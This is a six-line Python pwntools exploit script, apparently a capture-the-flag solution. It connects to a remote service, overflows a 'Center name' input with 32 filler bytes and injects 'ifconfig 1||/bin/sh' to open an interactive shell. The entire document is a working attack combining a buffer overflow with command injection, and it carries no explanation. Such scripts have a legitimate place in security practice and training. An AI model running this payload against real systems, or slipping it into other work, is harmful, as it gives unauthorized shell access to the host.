from pwn import *
p = remote(ADDRESS, PORT)
payload = b'A' * 32
payload += b'ifconfig 1||/bin/sh'
p.sendlineafter("Center name: ", payload)
p.interactive()